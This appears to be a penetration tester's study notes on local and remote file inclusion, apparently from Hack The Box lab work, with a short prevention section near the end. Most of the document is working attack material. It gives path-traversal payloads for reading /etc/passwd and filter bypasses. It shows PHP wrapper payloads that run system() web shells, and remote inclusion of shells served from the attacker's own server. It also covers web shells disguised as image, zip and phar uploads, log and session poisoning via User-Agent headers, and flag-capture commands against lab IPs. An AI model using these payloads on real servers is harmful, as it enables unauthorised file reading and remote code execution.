# file inclusion
- ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/image.png)
    - `/index.php?page=about` 
        - about may be able to be modified to return another page's content
        - assuming about.php is file
    - php
        - example
        ```php
        if (isset($_GET['language'])) {
            include($_GET['language']);
        }
        ```
        - language parameter is directly passed to include function
        - vulnerable code
            - `include()`   
            - `include_once()`  
            - `require()`
            - `require_once()` 
            - `file_get_contents()` 
    - nodejs
        - example
        ```js
        if(req.query.language) {
            fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
                res.write(data);
            });
        }
        ```
        - vulnerable code
            - `render`
    - express.js
        - example
        ```js
            app.get("/about/:language", function(req, res) {
                res.render(`/${req.params.language}/about.html`);
            });
        ```
        - vulnerable code
        - `readFile()` 
    - java
        - example
        ```java
        <c:if test="${not empty param.language}">
            <jsp:include file="<%= request.getParameter('language') %>" />
        </c:if>
        or
        <c:import url= "<%= request.getParameter('language') %>"/>
        ```
        - vulnerable code
            - include
            - import
    - .net
        - example
        ```c#
        @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
            <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
        }
        or
        @Html.Partial(HttpContext.Request.Query['language'])
        or
        <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
        ```
        - vulnerable code
            - response.writefile
            - partial
            - include
- local file inclusion
    - linux `/etc/passwd`
    - windows `C:\Windows\boot.ini`
    - path traversal 
        - `../../../../etc/passwd`
        - `/../../../../etc/passwd`
    - appended extensions
        - example `include($_GET['language'] . ".php");`
    - second order attacks
        - a web application may allow us to download our avatar through a URL like `(/profile/$username/avatar.png)`
        - try creating a malicious username like `../../../etc/passwd`
- basic bypasses
    - string replacement `../`
        - One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals
        - example `$language = str_replace('../', '', $_GET['language']);`
            - use `....//` instead of `../`
            - `....//....//....//....//etc/passwd`
    - encoding
        - Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals
        - try url encoding
            - use `%2e%2e%2f` instead of `../`
                - `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`
            - some url encoders do not encode `.`
                - `..%2F..%2F..%2F..%2Fetc%2Fpasswd` untested
        - try dbl url encoding
    - approved paths
        - Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path
        - example
        ```php
        if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
            include($_GET['language']);
        } else {
            echo 'Illegal path specified!';
        }
        ```
        - bypass the regex `./languages/../../../../etc/passwd`
    - appended extensions
        - obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4
        - path truncation
            - In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored
            - `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`
        - null bytes
            - PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string
            - `/etc/passwd%00`
- php filters
    - PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/
    - https://www.php.net/manual/en/filters.php
    - firstly fuzz for pages
        - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`
    - try to access identified files `http://<SERVER_IP>:<PORT>/index.php?language=config` but you may not receive anything
    - try to read the source code using the base64-encode filter
        - `php://filter/read=convert.base64-encode/resource=config`
        - `http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`
    - decode from base64 `echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`
        - make sure you view source to get the entire contents
    - `http://94.237.122.124:37924/index.php?language=php://filter/read=convert.base64-encode/resource=configure`
- php wrappers
    - looking for `allow_url_include` which is not enabled by default
    - php configuration files X.Y = version
        - apache `/etc/php/X.Y/apache2/php.ini`
        - nginz `/etc/php/X.Y/fpm/php.ini`
        - example `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
    - get the current page contents
        - `http://94.237.50.221:44356/index.php?page=php://filter/convert.base64-encode/resource=index`
        - 
    - look for `allow_url_include`
        - `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`
        - remote code execution
            - data wrapper attack
                - create base64 string of php cmd
                    - `echo '<?php system($_GET["cmd"]); ?>' | base64`
                - `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
                - `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid`
                - tested
                    - `curl -s 'http://94.237.123.98:39943/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&cmd=ls+/'`
                    - `curl -s 'http://94.237.123.98:39943/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt'`
            - input wrapper attack
                - `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`
    - look for `extension=expect`
        - expect wrapper attack
            - the expect wrapper, which allows us to directly run commands through URL streams
            - `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`
- remote file inclusion
    - [how to test for remote file inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
    - ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/image-1.png)
    - quick test `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
        - see if it can include itself
        - did it get rendered? we also have code execution then
        - Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
    - process
        - http
            - create web shell `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
            - run a python http server `sudo python3 -m http.server <LISTENING_PORT>`
            - execute `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
        - ftp
            - create web shell `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
            - `sudo python -m pyftpdlib -p 21`
            - `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
            - if you needed to authenticate with ftp you could use `curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'`
        - smb
            - If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
            - create smb server `impacket-smbserver -smb2support share $(pwd)`
            - use the unc path `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`
- file uploads
    - images
        -  If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
        -  ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/image-2.png)
        -  malicious image `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
        -  `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
    -  zip uploads
        -  malicious zip file named shell.jpg so we can upload it
            -  `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
        -  upload it
        -  execute using php zip wrapper
            -  `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
    -  phar upload
        -  a PHAR (PHP Archive) file is a package format to enable distribution of applications and libraries by bundling many PHP code files and other resources (e.g. images, stylesheets, etc.) into a single archive file. 
        -  create shell.php
        ```php
        <?php
        $phar = new Phar('shell.phar');
        $phar->startBuffering();
        $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
        $phar->setStub('<?php __HALT_COMPILER(); ?>');

        $phar->stopBuffering();
        ?>
        ```
        - compile and rename file to shell.jpg `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
        - execute `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
        - 
- log poisoning
    -  if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges
    -  ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/image-3.png)
    -  php session poisoning
        -  `PHPSESSID` cookies
        -  session files are located
            -  linux `/var/lib/php/sessions/`
            -  windows `C:\Windows\Temp\`
        -  session files are prefixed with `sess_`
        -  PHPSESSID  = el4ukv0kqbvoirg7nkp4dncpk3
            -  stored `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
        -  `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
        -  cookie contents may be modified if they are reflecting a querystring parameter - eg `page=aboutus`
            -  `?language=session_poisoning` 
        - example
            - `<?php system($_GET["cmd"]);?>` url encoded `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
            - make the request to poison the session variable 
                - `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
            - request our session cookie and pass a cmd parameter to get executed
            - `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
        - Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
- server log poisoning
    - Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header.
    - Apache logs are located in 
        - `/var/log/apache2/` on Linux and in 
        - `C:\xampp\apache\logs\` on Windows, while 
    - Nginx logs are located in 
        - `/var/log/nginx/` on Linux 
        - `C:\nginx\log\` on Windows
    - To verify fuzz with LFI list
        - `https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI`
    - example
        - logs are stored `/var/log/apache2/access.log`
            - `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
        - using burp
                - ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/rfi_repeater_ua.webp)
            - we modify the agent header to inject the php script
                - `<?php system($_GET["cmd"]);?>`
                - ![alt text](assets/attachments/kb/htb/redteam/assets/techniques/file-inclusions/rfi_cmd_repeater.webp)
        - cmd
            - `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison`
            - `curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison`
        - `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`
    - Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well. 
    - try these logs as well
        - ssh 
            - `/var/log/sshd.log`
            - set username as php `<?php system(\$_GET['cmd']); ?>` then read from web app
        - mail 
            - `/var/log/mail`   
            - body containing `<?php system(\$_GET['cmd']); ?>` then read from web app
        - ftp
            - `/var/log/vsftpd.log`
            - ftp logs, set username to `<?php system(\$_GET['cmd']); ?>` then read from web app
- automated scanning
    - fuzzing parameters
        - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
        - top 25 parameters for faster scanning
            - `https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters`
    - LFI wordlists
        - `https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt`
        - `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
    - server webroot
        - `https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt`
        - linux `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt`
        - win `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt`
        - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 228`
    - server logs/configs
        - linux `https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux`
        - win `https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows`
        - `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`
    - then request `curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf`
    - if you see `{APACHE_LOG_DIR}` this means its a global variable `/etc/apache2/envvars`
        - `curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars`
    - tools
        - [LFI Suite](https://github.com/D35m0nd142/LFISuite)
        - [LFI Freak](https://github.com/OsandaMalith/LFiFreak)
        - [liffy](https://github.com/mzfr/liffy)
- file inclusion prevention
    - avoid passing any user-controlled inputs into any file inclusion functions or APIs
    - no user input should be going to any functions without being sanitised
    - if you cannot avoid passing params, have a whitelist of available values that are safe and validate against them (case insentive)
    - The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename(), which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename
    - recursively remove any attempts to traverse directories
    ```php
    while(substr_count($input, '../', 0)) {
        $input = str_replace('../', '', $input);
    };
    ```
    - web server configuration
        - disable `allow_url_fopen` and `allow_url_include`
        - prevent accessing files outside of the web app in PHP that can be done by adding `open_basedir = /var/www` in the `php.ini` file. 
        - ensure that certain potentially dangerous modules are disabled, like `PHP Expect mod_userdir`.
    - web application firewalls (waf)
        -  ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.
        -  




- php alternative shell
```php
<?php $output = shell_exec('ls'); echo "<pre>$output</pre>"; ?>
```


- htb solution
```sh
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -o graceful

ffuf -w graceful:FUZZ -u 'http://94.237.51.163:50363/ilf_admin/index.php?log=../../../../../FUZZ' -fs 2046,3269,3478,3480,2358 -fw 245

- `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison`
- `curl -s "http://94.237.59.174:49303/index.php" -H @Poison`
            
http://94.237.51.163:50363/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
http://94.237.59.174:49303/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls+/
http://94.237.59.174:49303/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt

```